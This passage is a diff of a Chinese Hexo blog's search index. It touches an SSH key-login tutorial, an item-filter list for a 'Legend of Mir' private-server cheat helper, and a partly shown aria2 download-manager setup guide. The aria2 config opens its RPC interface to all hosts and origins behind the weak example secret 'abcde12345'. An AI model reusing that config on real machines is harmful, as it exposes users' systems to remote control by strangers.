class="number">398</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">01</span> id_rsa.<span class="property">pub</span></span><br></pre></td></tr></table></figure>
-
-<p>然后将公钥上传到需要登录的服务器，并以<code>userb</code>用户登录<br>至于上传方式可以用<code>scp</code>以及<code>sz</code>命令这里就介绍了<br>可以参考这篇<a href="https://shagain.club/index.php/archives/111/">文章</a></p>
-<blockquote>
-<p>上传到用户目录下的.ssh文件夹下<code>authorized_keys</code>这个文件是用来存放公钥内容的我们使用<code>cat</code>把公钥追加到<code>authorized_keys</code>这个文件就好了</p>
-</blockquote>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cat id_rsa.<span class="property">pub</span> &gt;&gt; ~<span class="regexp">/.ssh/</span>authorized_keys    <span class="comment">//cat 公钥路径 &gt;&gt; ~/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
-
-<p>这样子我们就配置好了<br>另外我们要注意，<code>.ssh</code>目录的权限为<code>700</code>，其下文件<code>authorized_keys</code>和私钥的权限为<code>600</code>。否则会因为权限问题导致无法免密码登录。我们可以看到登陆后会有<code>known_hosts</code>文件生成。</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -916,26 +956,6 @@
       </tags>
   </entry>
   <entry>
-    <title>传奇内挂垃圾物品过滤</title>
-    <url>/2022/09/03/%E4%BC%A0%E5%A5%87%E5%86%85%E6%8C%82%E5%9E%83%E5%9C%BE%E7%89%A9%E5%93%81%E8%BF%87%E6%BB%A4/</url>
-    <content><![CDATA[<p> 传奇内挂过滤垃圾。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209031601159.png" alt="image-20220903160139387"></p>
-<p>先打开传奇目录 <code>D:\传奇私服\Config </code>   修改DAT档案文件，把下面内容复制粘贴进去保存即可：</p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">金创药(小量),药品类,0,0,0,0</span><br><span class="line">魔法药(小量),药品类,0,0,0,0</span><br><span class="line">肉,其它类,0,0,0,0</span><br><span class="line">布衣(男),服装类,0,0,0,0</span><br><span class="line">布衣(女),服装类,0,0,0,0</span><br><span class="line">木剑,武器类,0,0,0,0</span><br><span class="line">铁剑,武器类,0,0,0,0</span><br><span class="line">青铜剑,武器类,0,0,0,0</span><br><span class="line">轻型盔甲(男),服装类,0,0,0,0</span><br><span class="line">轻型盔甲(女),服装类,0,0,0,0</span><br><span class="line">凝霜,武器类,0,0,0,0</span><br><span class="line">短剑,武器类,0,0,0,0</span><br><span class="line">青铜斧,武器类,0,0,0,0</span><br><span class="line">重盔甲(女),服装类,0,0,0,0</span><br><span class="line">魔法长袍(女),服装类,0,0,0,0</span><br><span class="line">灵魂战衣(女),服装类,0,0,0,0</span><br><span class="line">重盔甲(男),服装类,0,0,0,0</span><br><span class="line">魔法长袍(男),服装类,0,0,0,0</span><br><span class="line">灵魂战衣(男),服装类,0,0,0,0</span><br><span class="line">海魂,武器类,0,0,0,0</span><br><span class="line">修罗,武器类,0,0,0,0</span><br><span class="line">破魂,武器类,0,0,0,0</span><br><span class="line">斩马刀,武器类,0,0,0,0</span><br><span class="line">青铜头盔,首饰类,0,0,0,0</span><br><span class="line">金项链,首饰类,0,0,0,0</span><br><span class="line">铁手镯,首饰类,0,0,0,0</span><br><span class="line">灰色药粉(中量),药品类,0,0,0,0</span><br><span class="line">黄色药粉(中量),药品类,0,0,0,0</span><br><span class="line">八荒,武器类,0,0,0,0</span><br><span class="line">玻璃戒指,首饰类,0,0,0,0</span><br><span class="line">牛角戒指,首饰类,0,0,0,0</span><br><span class="line">蓝色水晶戒指,首饰类,0,0,0,0</span><br><span class="line">黑檀项链,首饰类,0,0,0,0</span><br><span class="line">黄色水晶项链,首饰类,0,0,0,0</span><br><span class="line">黑色水晶项链,首饰类,0,0,0,0</span><br><span class="line">半月,武器类,0,0,0,0</span><br><span class="line">皮制手套,首饰类,0,0,0,0</span><br><span class="line">钢手镯,首饰类,0,0,0,0</span><br><span class="line">生铁戒指,首饰类,0,0,0,0</span><br><span class="line">金戒指,首饰类,0,0,0,0</span><br><span class="line">灯笼项链,首饰类,1,1,1,0</span><br><span class="line">白色虎齿项链,首饰类,1,1,1,0</span><br><span class="line">魅力戒指,首饰类,0,0,0,0</span><br><span class="line">道德戒指,首饰类,0,0,0,0</span><br><span class="line">白金项链,首饰类,0,0,0,0</span><br><span class="line">降妖除魔戒指,首饰类,0,0,0,0</span><br><span class="line">偃月,武器类,0,0,0,0</span><br><span class="line">降魔,武器类,0,0,0,0</span><br><span class="line">小手镯,首饰类,0,0,0,0</span><br><span class="line">银手镯,首饰类,0,0,0,0</span><br><span class="line">大手镯,首饰类,0,0,0,0</span><br><span class="line">金创药(中量),药品类,0,0,0,0</span><br><span class="line">魔法药(中量),药品类,0,0,0,0</span><br><span class="line">黑色水晶戒指,首饰类,0,0,0,0</span><br><span class="line">魔鬼项链,首饰类,0,0,0,0</span><br><span class="line">珊瑚戒指,首饰类,0,0,0,0</span><br><span class="line">蓝翡翠项链,首饰类,0,0,0,0</span><br><span class="line">蛇眼戒指,首饰类,0,0,0,0</span><br><span class="line">琥珀项链,首饰类,0,0,0,0</span><br><span class="line">放大镜,首饰类,0,0,0,0</span><br><span class="line">珍珠戒指,首饰类,0,0,0,0</span><br><span class="line">竹笛,首饰类,0,0,0,0</span><br><span class="line">骷髅戒指,首饰类,0,0,0,0</span><br><span class="line">死神手套,首饰类,0,0,0,0</span><br><span class="line">骷髅头盔,首饰类,0,0,0,0</span><br><span class="line">魔法手镯,首饰类,0,0,0,0</span><br><span class="line">金手镯,首饰类,0,0,0,0</span><br><span class="line">道士头盔,首饰类,0,0,0,0</span><br><span class="line">凤凰明珠,首饰类,0,0,0,0</span><br><span class="line">道士手镯,首饰类,0,0,0,0</span><br><span class="line">黑檀手镯,首饰类,0,0,0,0</span><br><span class="line">铁矿,其它类,0,0,0,0</span><br><span class="line">黑铁矿,其它类,0,0,0,0</span><br><span class="line">困魔咒,其它类,0,0,0,0</span><br><span class="line">召唤骷髅,其它类,0,0,0,0</span><br><span class="line">地狱雷光,其它类,0,0,0,0</span><br><span class="line">半月弯刀,其它类,0,0,0,0</span><br><span class="line">太阳水,药品类,0,1,0,0</span><br><span class="line">强效金创药,药品类,0,1,0,0</span><br><span class="line">强效魔法药,药品类,0,1,0,0</span><br><span class="line">野蛮冲撞,其它类,0,0,0,0</span><br><span class="line">群体治疗术,其它类,0,0,0,0</span><br><span class="line">圣言术,其它类,0,0,0,0</span><br><span class="line">强效太阳水,药品类,0,1,0,0</span><br><span class="line">魔力手镯,首饰类,0,0,0,0</span><br><span class="line">攻击力药水,其它类,0,0,0,0</span><br><span class="line">道术力药水,其它类,0,0,0,0</span><br><span class="line">疾风药水,其它类,0,0,0,0</span><br><span class="line">体力强化水,其它类,0,0,0,0</span><br><span class="line">魔力强化水,其它类,0,0,0,0</span><br><span class="line">战神盔甲(男),服装类,0,0,0,0</span><br><span class="line">战神盔甲(女),服装类,0,0,0,0</span><br><span class="line">幽灵战衣(男),服装类,0,0,0,0</span><br><span class="line">幽灵战衣(女),服装类,0,0,0,0</span><br><span class="line">恶魔长袍(男),服装类,0,0,0,0</span><br><span class="line">恶魔长袍(女),服装类,0,0,0,0</span><br><span class="line">中型盔甲(男),服装类,0,0,0,0</span><br><span class="line">灯笼项链②,首饰类,1,1,1,0</span><br><span class="line">灯笼项链[残],首饰类,1,1,1,0</span><br><span class="line">白色虎齿项链[残],首饰类,1,1,1,0</span><br><span class="line">白色虎齿项链②,首饰类,1,1,1,0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>游戏</category>
-        <category>传奇</category>
-      </categories>
-      <tags>
-        <tag>传奇</tag>
-        <tag>外挂</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用HEXO-GIT-BACKUP插件备份博客源文件</title>
     <url>/2022/08/21/%E4%BD%BF%E7%94%A8HEXO-GIT-BACKUP%E6%8F%92%E4%BB%B6%E5%A4%87%E4%BB%BD%E5%8D%9A%E5%AE%A2%E6%BA%90%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<p>在搭建好hexo博客之后也要给自己的博客进行备份，文章丢失可是很麻烦的一件事情。我的博客的数据都是直接保存在cloudstudio，用的时候总是会感觉有点问题，生怕自己哪天不小心把工作空间给删除了，那就蛮麻烦了。所以我采用了 <a href="https://github.com/coneycode/hexo-git-backup">hexo-git-backup</a> 这个工具进行备份。</p>
@@ -983,6 +1003,26 @@
       </categories>
       <tags>
         <tag>插件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>传奇内挂垃圾物品过滤</title>
+    <url>/2022/09/03/%E4%BC%A0%E5%A5%87%E5%86%85%E6%8C%82%E5%9E%83%E5%9C%BE%E7%89%A9%E5%93%81%E8%BF%87%E6%BB%A4/</url>
+    <content><![CDATA[<p> 传奇内挂过滤垃圾。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209031601159.png" alt="image-20220903160139387"></p>
+<p>先打开传奇目录 <code>D:\传奇私服\Config </code>   修改DAT档案文件，把下面内容复制粘贴进去保存即可：</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">金创药(小量),药品类,0,0,0,0</span><br><span class="line">魔法药(小量),药品类,0,0,0,0</span><br><span class="line">肉,其它类,0,0,0,0</span><br><span class="line">布衣(男),服装类,0,0,0,0</span><br><span class="line">布衣(女),服装类,0,0,0,0</span><br><span class="line">木剑,武器类,0,0,0,0</span><br><span class="line">铁剑,武器类,0,0,0,0</span><br><span class="line">青铜剑,武器类,0,0,0,0</span><br><span class="line">轻型盔甲(男),服装类,0,0,0,0</span><br><span class="line">轻型盔甲(女),服装类,0,0,0,0</span><br><span class="line">凝霜,武器类,0,0,0,0</span><br><span class="line">短剑,武器类,0,0,0,0</span><br><span class="line">青铜斧,武器类,0,0,0,0</span><br><span class="line">重盔甲(女),服装类,0,0,0,0</span><br><span class="line">魔法长袍(女),服装类,0,0,0,0</span><br><span class="line">灵魂战衣(女),服装类,0,0,0,0</span><br><span class="line">重盔甲(男),服装类,0,0,0,0</span><br><span class="line">魔法长袍(男),服装类,0,0,0,0</span><br><span class="line">灵魂战衣(男),服装类,0,0,0,0</span><br><span class="line">海魂,武器类,0,0,0,0</span><br><span class="line">修罗,武器类,0,0,0,0</span><br><span class="line">破魂,武器类,0,0,0,0</span><br><span class="line">斩马刀,武器类,0,0,0,0</span><br><span class="line">青铜头盔,首饰类,0,0,0,0</span><br><span class="line">金项链,首饰类,0,0,0,0</span><br><span class="line">铁手镯,首饰类,0,0,0,0</span><br><span class="line">灰色药粉(中量),药品类,0,0,0,0</span><br><span class="line">黄色药粉(中量),药品类,0,0,0,0</span><br><span class="line">八荒,武器类,0,0,0,0</span><br><span class="line">玻璃戒指,首饰类,0,0,0,0</span><br><span class="line">牛角戒指,首饰类,0,0,0,0</span><br><span class="line">蓝色水晶戒指,首饰类,0,0,0,0</span><br><span class="line">黑檀项链,首饰类,0,0,0,0</span><br><span class="line">黄色水晶项链,首饰类,0,0,0,0</span><br><span class="line">黑色水晶项链,首饰类,0,0,0,0</span><br><span class="line">半月,武器类,0,0,0,0</span><br><span class="line">皮制手套,首饰类,0,0,0,0</span><br><span class="line">钢手镯,首饰类,0,0,0,0</span><br><span class="line">生铁戒指,首饰类,0,0,0,0</span><br><span class="line">金戒指,首饰类,0,0,0,0</span><br><span class="line">灯笼项链,首饰类,1,1,1,0</span><br><span class="line">白色虎齿项链,首饰类,1,1,1,0</span><br><span class="line">魅力戒指,首饰类,0,0,0,0</span><br><span class="line">道德戒指,首饰类,0,0,0,0</span><br><span class="line">白金项链,首饰类,0,0,0,0</span><br><span class="line">降妖除魔戒指,首饰类,0,0,0,0</span><br><span class="line">偃月,武器类,0,0,0,0</span><br><span class="line">降魔,武器类,0,0,0,0</span><br><span class="line">小手镯,首饰类,0,0,0,0</span><br><span class="line">银手镯,首饰类,0,0,0,0</span><br><span class="line">大手镯,首饰类,0,0,0,0</span><br><span class="line">金创药(中量),药品类,0,0,0,0</span><br><span class="line">魔法药(中量),药品类,0,0,0,0</span><br><span class="line">黑色水晶戒指,首饰类,0,0,0,0</span><br><span class="line">魔鬼项链,首饰类,0,0,0,0</span><br><span class="line">珊瑚戒指,首饰类,0,0,0,0</span><br><span class="line">蓝翡翠项链,首饰类,0,0,0,0</span><br><span class="line">蛇眼戒指,首饰类,0,0,0,0</span><br><span class="line">琥珀项链,首饰类,0,0,0,0</span><br><span class="line">放大镜,首饰类,0,0,0,0</span><br><span class="line">珍珠戒指,首饰类,0,0,0,0</span><br><span class="line">竹笛,首饰类,0,0,0,0</span><br><span class="line">骷髅戒指,首饰类,0,0,0,0</span><br><span class="line">死神手套,首饰类,0,0,0,0</span><br><span class="line">骷髅头盔,首饰类,0,0,0,0</span><br><span class="line">魔法手镯,首饰类,0,0,0,0</span><br><span class="line">金手镯,首饰类,0,0,0,0</span><br><span class="line">道士头盔,首饰类,0,0,0,0</span><br><span class="line">凤凰明珠,首饰类,0,0,0,0</span><br><span class="line">道士手镯,首饰类,0,0,0,0</span><br><span class="line">黑檀手镯,首饰类,0,0,0,0</span><br><span class="line">铁矿,其它类,0,0,0,0</span><br><span class="line">黑铁矿,其它类,0,0,0,0</span><br><span class="line">困魔咒,其它类,0,0,0,0</span><br><span class="line">召唤骷髅,其它类,0,0,0,0</span><br><span class="line">地狱雷光,其它类,0,0,0,0</span><br><span class="line">半月弯刀,其它类,0,0,0,0</span><br><span class="line">太阳水,药品类,0,1,0,0</span><br><span class="line">强效金创药,药品类,0,1,0,0</span><br><span class="line">强效魔法药,药品类,0,1,0,0</span><br><span class="line">野蛮冲撞,其它类,0,0,0,0</span><br><span class="line">群体治疗术,其它类,0,0,0,0</span><br><span class="line">圣言术,其它类,0,0,0,0</span><br><span class="line">强效太阳水,药品类,0,1,0,0</span><br><span class="line">魔力手镯,首饰类,0,0,0,0</span><br><span class="line">攻击力药水,其它类,0,0,0,0</span><br><span class="line">道术力药水,其它类,0,0,0,0</span><br><span class="line">疾风药水,其它类,0,0,0,0</span><br><span class="line">体力强化水,其它类,0,0,0,0</span><br><span class="line">魔力强化水,其它类,0,0,0,0</span><br><span class="line">战神盔甲(男),服装类,0,0,0,0</span><br><span class="line">战神盔甲(女),服装类,0,0,0,0</span><br><span class="line">幽灵战衣(男),服装类,0,0,0,0</span><br><span class="line">幽灵战衣(女),服装类,0,0,0,0</span><br><span class="line">恶魔长袍(男),服装类,0,0,0,0</span><br><span class="line">恶魔长袍(女),服装类,0,0,0,0</span><br><span class="line">中型盔甲(男),服装类,0,0,0,0</span><br><span class="line">灯笼项链②,首饰类,1,1,1,0</span><br><span class="line">灯笼项链[残],首饰类,1,1,1,0</span><br><span class="line">白色虎齿项链[残],首饰类,1,1,1,0</span><br><span class="line">白色虎齿项链②,首饰类,1,1,1,0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>游戏</category>
+        <category>传奇</category>
+      </categories>
+      <tags>
+        <tag>传奇</tag>
+        <tag>外挂</tag>
       </tags>
   </entry>
   <entry>
@@ -1066,6 +1106,66 @@
       </categories>
       <tags>
         <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在Win环境安装下载神器Aria2</title>
+    <url>/2023/01/26/%E5%9C%A8Win%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8Aria2/</url>
+    <content><![CDATA[<h3 id="Aria2-介绍"><a href="#Aria2-介绍" class="headerlink" title="Aria2 介绍"></a>Aria2 介绍</h3><p>Aria2 是一个多平台轻量级，支持 HTTP、FTP、BitTorrent 等多协议、多来源的命令行下载工具。Aria2 可以从多个来源、多个协议下载资源，最大的程度上利用了你的带宽。Aria2 有着非常小的资源占用，在关闭磁盘缓存的情况下，物理内存占用通常为 4M（正常 HTTP&#x2F;FTP 下载的情况下），BitTorrent 下载每秒2.8M&#x2F;S的情况下，CPU 占有率约为 6%。Aria2 支持 JSON-RPC 和 XML-RPC 接口远程调用。总之一句话就是简洁，<strong>简</strong>到连个界面都没有。</p>
+<h3 id="Aria2-核心程序"><a href="#Aria2-核心程序" class="headerlink" title="Aria2 核心程序"></a>Aria2 核心程序</h3><p>GitHub 下载地址：</p>
+<p><a href="https://github.com/aria2/aria2/releases">https://github.com/aria2/aria2</a></p>
+<p>找到最新版的核心文件，选择适合的版本进行下载：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262322405.png" alt="img"></p>
+<p>这里我选择的是64位的版本，下载后解压缩文件，将文件夹转移到你希望放置程序的地方（尽量选择非中文的目录路径），比如我这里将文件夹改名并放在<code>C:\others\aria2</code>。</p>
+<h3 id="创建相关文件"><a href="#创建相关文件" class="headerlink" title="创建相关文件"></a>创建相关文件</h3><p>放置好 Aria2 的核心程序文件夹后，还需要在文件夹里新建3个空文件，这里可以使用<code>记事本.exe</code>来新建，保存的时候注意<strong>文件格式</strong>后缀：</p>
+<blockquote>
+<p>Aria2.log （日志文件）<br>aria2.session （用于记录下载历史，以便断点续传）<br>aria2.conf （配置文件）</p>
+</blockquote>
+<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>用文本编辑器打开刚才新建的<code>aria2.conf</code>文件，复制粘贴下面的代码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 井号开头的为注释内容，选项都有相应的注释说明，根据需要修改</span></span><br><span class="line"><span class="comment"># 被注释的选项填写的是默认值，建议在需要修改时再删掉注释</span></span><br><span class="line"><span class="comment"># 该配置引用了部分&#x27;Aria2完美配置&#x27; https://github.com/P3TERX/aria2.conf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#################</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 文件保存设置 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载目录，可使用绝对路径或相对路径，务必修改成自己的下载路径</span></span><br><span class="line"><span class="built_in">dir</span>=E:\Aria2Download</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 日志文件的保存路径</span></span><br><span class="line"><span class="built_in">log</span>=C:\others\aria2\Aria2.<span class="built_in">log</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启用磁盘缓存，0为禁用缓存，默认:16M，最大64M</span></span><br><span class="line"><span class="comment"># 磁盘缓存的作用是把下载的数据块临时存储在内存中，然后集中写入硬盘，以减少磁盘 I/O ，提升读写性能，延长硬盘寿命</span></span><br><span class="line"><span class="comment"># 建议在有足够的内存空闲情况下适当增加，但不要超过剩余可用内存空间大小</span></span><br><span class="line"><span class="comment"># 此项值仅决定上限，实际对内存的占用取决于网速带宽和设备性能等其它因素</span></span><br><span class="line">disk-cache=32M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件预分配可以帮助机械硬盘有效降低磁盘碎片，提升磁盘读写性能，延长磁盘寿命</span></span><br><span class="line"><span class="comment"># 默认：prealloc，可选：none，prealloc，trunc，falloc</span></span><br><span class="line"><span class="comment"># prealloc 分配速度慢，falloc 和 trunc 则需要文件系统和内核支持，不推荐使用</span></span><br><span class="line"><span class="comment"># btrfs、xfs、NTFS（仅 MinGW 编译版本）等文件系统建议设置为 falloc</span></span><br><span class="line"><span class="comment"># Ext3/4（具有扩展支持）建议 trunc</span></span><br><span class="line"><span class="comment"># 固态硬盘不需要预分配，只建议设置为 none，否则可能会导致双倍文件大小的数据写入，从而影响寿命</span></span><br><span class="line"><span class="comment"># MacOS 需要注释此项</span></span><br><span class="line">file-allocation=prealloc</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件预分配大小限制</span></span><br><span class="line"><span class="comment"># 小于此选项值大小的文件不预分配空间，单位 K 或 M，默认：5M</span></span><br><span class="line"><span class="comment"># no-file-allocation-limit=32M</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 断点续传</span></span><br><span class="line"><span class="built_in">continue</span>=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 始终尝试断点续传，无法断点续传则终止下载，默认：true</span></span><br><span class="line">always-resume=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 不支持断点续传的 URI 数值，当 always-resume=false 时生效</span></span><br><span class="line"><span class="comment"># 达到这个数值将从头开始下载，值为 0 时所有 URI 不支持断点续传时才从头开始下载</span></span><br><span class="line"><span class="comment"># max-resume-failure-tries=0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取服务器文件时间，默认:false</span></span><br><span class="line">remote-time=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 进度保存相关设置 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 从会话文件中读取下载任务</span></span><br><span class="line">input-file=C:\others\aria2\aria2.session</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 会话文件保存路径</span></span><br><span class="line"><span class="comment"># Aria2 退出时或指定的时间间隔会保存`错误/未完成`的下载任务到会话文件</span></span><br><span class="line">save-session=C:\others\aria2\aria2.session</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 任务状态改变后保存会话的间隔时间（秒），0 为仅在进程正常退出时保存，默认:0</span></span><br><span class="line"><span class="comment"># 为了及时保存任务状态、防止任务丢失，此项值只建议设置为 1</span></span><br><span class="line">save-session-interval=1</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 自动保存任务进度到控制文件(*.aria2)的间隔时间（秒）</span></span><br><span class="line"><span class="comment"># 0 为仅在进程正常退出时保存，默认：60</span></span><br><span class="line"><span class="comment"># 此项值也会间接影响从内存中把缓存的数据写入磁盘的频率</span></span><br><span class="line"><span class="comment"># 想降低磁盘 IOPS (每秒读写次数)则提高间隔时间</span></span><br><span class="line"><span class="comment"># 想在意外非正常退出时尽量保存更多的下载进度则降低间隔时间</span></span><br><span class="line"><span class="comment"># 非正常退出：进程崩溃、系统崩溃、SIGKILL 信号、设备断电等</span></span><br><span class="line">auto-save-interval=20</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 强制保存，即使任务已完成也保存信息到会话文件，默认：false</span></span><br><span class="line"><span class="comment"># 开启后会在任务完成后保留 .aria2 文件，文件被移除且任务存在的情况下重启后会重新下载</span></span><br><span class="line"><span class="comment"># 关闭后已完成的任务列表会在重启后清空</span></span><br><span class="line">force-save=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 下载连接相关 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件未找到重试次数，默认：0 (禁用)</span></span><br><span class="line"><span class="comment"># 重试时同时会记录重试次数，所以也需要设置 max-tries 这个选项</span></span><br><span class="line">max-file-not-found=5</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最大尝试次数，0 表示无限，默认:5</span></span><br><span class="line">max-tries=5</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重试等待时间（秒），默认:0 (禁用)</span></span><br><span class="line">retry-wait=15</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 连接超时时间（秒）。默认：60</span></span><br><span class="line">connect-timeout=30</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 超时时间（秒）。默认：60</span></span><br><span class="line"><span class="built_in">timeout</span>=30</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最大同时下载任务数，运行时可修改，默认:5</span></span><br><span class="line"><span class="comment">#max-concurrent-downloads=5</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 同一服务器最大连接线程数，添加时可指定，默认：1</span></span><br><span class="line"><span class="comment"># 最大值为 16，且受限于单任务最大连接线程数 split 所设定的值</span></span><br><span class="line">max-connection-per-server=16</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 单个任务最大线程数，添加时可指定，默认:5</span></span><br><span class="line"><span class="built_in">split</span>=8</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最小文件分片大小，添加时可指定，取值范围1M -1024M，默认：20M</span></span><br><span class="line"><span class="comment"># 比如此项值为 10M，当文件为 20MB 会分成两段并使用两个来源下载，文件为 15MB 则只使用一个来源下载</span></span><br><span class="line"><span class="comment"># 理论上值越小使用下载分段就越多，所能获得的实际线程数就越大，下载速度就越快，但受限于所下载文件服务器的策略</span></span><br><span class="line">min-split-size=8M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># HTTP/FTP 下载分片大小，所有分割都必须是此项值的倍数</span></span><br><span class="line"><span class="comment"># 最小值为 1M (增强版为 1K)，默认：1M</span></span><br><span class="line">piece-length=1M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 允许分片大小变化，默认：false</span></span><br><span class="line"><span class="comment"># false：当分片大小与控制文件中的不同时将会中止下载</span></span><br><span class="line"><span class="comment"># true：丢失部分下载进度继续下载</span></span><br><span class="line">allow-piece-length-change=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 全局最大下载速度限制，运行时可修改，默认：0 (无限制)</span></span><br><span class="line">max-overall-download-limit=0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 全局最大上传速度限制，运行时可修改，默认：0 (无限制)</span></span><br><span class="line"><span class="comment"># 设置过低可能影响 BT 下载速度</span></span><br><span class="line">max-overall-upload-limit=64K</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 单任务下载速度限制，默认：0 (无限制)</span></span><br><span class="line">max-download-limit=0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 单任务上传速度限制，默认：0 (无限制)</span></span><br><span class="line">max-upload-limit=32K</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 禁用 IPv6，默认:false</span></span><br><span class="line">disable-ipv6=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># URI 复用，默认: true</span></span><br><span class="line">reuse-uri=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 允许覆盖，当相关控制文件(.aria2)不存在时从头开始重新下载，默认：false</span></span><br><span class="line">allow-overwrite=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件自动重命名，此选项仅在 HTTP(S)/FTP 下载中有效</span></span><br><span class="line"><span class="comment"># 新文件名在名称之后扩展名之前加上一个点和一个数字（1..9999），默认：true</span></span><br><span class="line">auto-file-renaming=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 客户端伪装 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 自定义 User Agent</span></span><br><span class="line">user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47</span><br><span class="line"> </span><br><span class="line"><span class="comment">### RPC相关设置 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启用 JSON-RPC/XML-RPC 服务器，默认：false</span></span><br><span class="line">enable-rpc=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 接受所有远程请求，默认：false</span></span><br><span class="line">rpc-allow-origin-all=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 允许外部访问，默认：false</span></span><br><span class="line">rpc-listen-all=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 事件轮询方式</span></span><br><span class="line"><span class="comment"># 可选：epoll、kqueue、port、poll、select，不同系统默认值不同</span></span><br><span class="line"><span class="comment">#event-poll=select</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># RPC 监听端口，默认：6800</span></span><br><span class="line">rpc-listen-port=6800</span><br><span class="line"> </span><br><span class="line"><span class="comment"># RPC 最大请求大小</span></span><br><span class="line">rpc-max-request-size=10M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置的 RPC 授权密钥，取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line">rpc-secret=abcde12345</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 是否启用 RPC 服务的 SSL/TLS 加密，默认：false</span></span><br><span class="line"><span class="comment"># 启用加密后必须使用 https 或者 wss 协议连接</span></span><br><span class="line"><span class="comment"># 不推荐开启，建议使用 web server 反向代理</span></span><br><span class="line"><span class="comment"># 比如 Nginx、Caddy，灵活性更强</span></span><br><span class="line"><span class="comment">#rpc-secure=true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span></span><br><span class="line"><span class="comment"># 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span></span><br><span class="line"><span class="comment">#rpc-certificate=/path/to/certificate.pem</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span></span><br><span class="line"><span class="comment">#rpc-private-key=/path/to/certificate.key</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### BT/PT下载相关 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT 监听端口(TCP), 默认：6881-6999</span></span><br><span class="line"><span class="comment"># 直通外网的设备，比如 VPS ，务必配置防火墙和安全组策略允许此端口入站</span></span><br><span class="line"><span class="comment"># 内网环境的设备，比如 NAS ，除了防火墙设置，还需在路由器设置外网端口转发到此端口</span></span><br><span class="line">listen-port=51413</span><br><span class="line"> </span><br><span class="line"><span class="comment"># DHT 网络与 UDP tracker 监听端口(UDP), 